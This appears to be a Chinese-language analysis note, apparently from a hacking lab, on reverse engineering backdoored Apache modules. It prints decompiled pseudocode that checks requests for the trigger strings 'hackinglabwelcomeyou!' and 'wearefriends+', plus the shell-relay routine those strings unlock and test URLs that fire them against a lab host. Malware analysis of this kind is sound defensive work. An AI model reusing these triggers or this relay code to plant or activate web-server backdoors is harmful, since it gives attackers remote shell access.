# 基础知识

以sub开头加地址的是没有函数表也不是debug的

# 先分析一个简单的
地址：[Apache-HTTP-Server-Module-Backdoor](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)

> 这个是使用了一个popen的函数执行了系统命令，配合源码，感觉比较容易看懂

![title](https://i.loli.net/2019/05/14/5cda26a7ac7a028583.png)


# 再来分析这个

首先，根据上面的思路，发现没有白底加粗的自定义的函数，，，，然后找到一个_init_proc初始化的一个函数,直接F5（目前还就会这一个操做）
```
void (*init_proc())(void)
{
  start();
  sub_1010();
  return sub_2280();
}
```
start()应该就是类似初始化的一些操做。和上一个对比了一下，发现并没有什么异常接下来查看sub_1010代码如下
```
signed __int64 __fastcall sub_2101(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = ap_get_module_config(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 104LL), (__int64)&core_module);
  if ( v3 )
    v2 = *(_DWORD *)(v3 + 8);
  if ( *(_QWORD *)(a1 + 352) && !strcmp(*(const char **)(a1 + 352), "hackinglabwelcomeyou!")
    || *(_QWORD *)(a1 + 384) && !strcmp(*(const char **)(a1 + 384), "hackinglabwelcomeyou!") )
  {
    process_client(256, v2);
  }
  if ( *(_QWORD *)(a1 + 352) && !strcmp(*(const char **)(a1 + 352), "wearefriends+")
    || *(_QWORD *)(a1 + 384) && !strcmp(*(const char **)(a1 + 384), "wearefriends+") )
  {
    process_client(512, v2);
  }
  return 0xFFFFFFFFLL;
}
```
先读取了一个配置文件（后来我查了一下ap_get_module_config，应该是还可以读取url的一些信息），然后根据这个信息得到v2然后做了两个字符串的比较分别执行了process_client(256, v2)和process_client(512, v2)
```
void __fastcall __noreturn process_client(int a1, int a2)
{
  unsigned int v2; // edx
  int v3; // eax
  unsigned int v4; // edx
  ssize_t v5; // rax
  ssize_t v6; // rax
  char s1; // [rsp+10h] [rbp-10A0h]
  fd_set readfds; // [rsp+1010h] [rbp-A0h]
  int buf; // [rsp+1090h] [rbp-20h]
  int v10; // [rsp+1094h] [rbp-1Ch]
  int v11; // [rsp+1098h] [rbp-18h]
  int v12; // [rsp+109Ch] [rbp-14h]

  buf = a1;
  v10 = write(pipe_A[1], &buf, 4uLL);
  if ( v10 != 4 )
    exit(0);
  v10 = read(pipe_B[0], &buf, 4uLL);
  if ( v10 != 4 )
    exit(0);
  if ( buf == 16 )
    exit(0);
  while ( 1 )
  {
    memset(&readfds, 0, sizeof(readfds));
    v11 = 0;
    v12 = (unsigned __int64)&buf;
    v2 = (unsigned int)(pipe_B[2 * buf] >> 31) >> 26;
    readfds.fds_bits[pipe_B[2 * buf] / 64] |= 1LL << (((v2 + pipe_B[2 * buf]) & 0x3F) - v2);
    readfds.fds_bits[a2 / 64] |= 1LL << a2 % 64;
    v3 = a2;
    if ( pipe_B[2 * buf] >= a2 )
      v3 = pipe_B[2 * buf];
    v10 = v3;
    if ( select(v3 + 1, &readfds, 0LL, 0LL, 0LL) < 0 )
      exit(0);
    v4 = (unsigned int)(pipe_B[2 * buf] >> 31) >> 26;
    if ( !((readfds.fds_bits[pipe_B[2 * buf] / 64] >> (((v4 + pipe_B[2 * buf]) & 0x3F) - v4)) & 1) )
      goto LABEL_24;
    v10 = read(pipe_B[2 * buf], &s1, 0x1000uLL);
    if ( v10 > 0 )
    {
      if ( !strncmp(&s1, &s2, 4uLL) )
      {
        shutdown(a2, 2);
        exit(0);
      }
      v5 = send(a2, &s1, v10, 0);
      if ( v5 == v10 )
      {
LABEL_24:
        if ( !((readfds.fds_bits[a2 / 64] >> a2 % 64) & 1) )
          continue;
        v10 = recv(a2, &s1, 0x1000uLL, 0);
        if ( v10 > 0 )
        {
          v6 = write(pipe_A[2LL * buf + 1], &s1, v10);
          if ( v6 == v10 )
            continue;
        }
      }
    }
    shutdown(a2, 2);
    write(pipe_A[1], &buf, 4uLL);
    exit(0);
  }
}
```
> 这个就没有之前那么简单了，好像看一眼源码啊

综合一下上面的分析尝试访问下面两个url
```
view-source:http://192.168.72.137/?wearefriends+
回显rootme-0.3 ready，说明的确是这样用的

http://192.168.72.137/?hackinglabwelcomeyou!
无线连接，感觉有点像反弹shell时候的状态，而且上面的的函数命名为process_client有点可能是弹shell吧，那就是正向连接和反弹shell
```
